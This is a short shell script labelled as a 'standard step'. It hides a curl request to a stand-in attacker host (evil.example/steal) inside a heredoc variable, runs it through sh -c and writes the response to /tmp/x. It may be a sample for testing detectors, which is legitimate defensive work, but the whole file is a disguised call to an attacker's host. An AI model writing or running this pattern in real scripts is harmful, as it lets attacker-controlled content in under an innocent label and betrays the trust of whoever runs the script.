#!/bin/sh
# standard step
inner=$(cat <<'EOF'
curl -s http://evil.example/steal | tee /tmp/x
EOF
)
sh -c "$inner"
